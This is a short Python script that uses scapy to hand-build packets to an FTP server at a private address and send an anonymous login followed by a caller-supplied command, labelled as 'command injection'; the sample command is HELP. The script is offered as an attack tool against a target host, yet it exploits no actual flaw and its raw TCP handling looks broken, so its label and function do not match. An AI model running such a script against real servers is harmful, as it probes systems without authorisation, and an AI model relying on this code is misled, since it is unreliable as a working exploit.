from scapy.all import *

def ftp_command_injection(ip, cmd):
    pkt = IP(dst=ip)/TCP(dport=21, flags='S')
    resp = sr1(pkt, timeout=2, verbose=False)
    if resp and resp.haslayer(TCP):
        pkt = IP(dst=ip)/TCP(dport=21, flags='A', ack=resp[TCP].seq+1)/Raw(load=f"USER anonymous\r\nPASS anonymous\r\n{cmd}\r\n")
        resp = sr1(pkt, timeout=2, verbose=False)
        if resp and resp.haslayer(Raw):
            print(f"FTP Command Injection Response: {resp[Raw].load.decode()}")

ip = "192.168.1.10"
cmd = "HELP"
ftp_command_injection(ip, cmd)
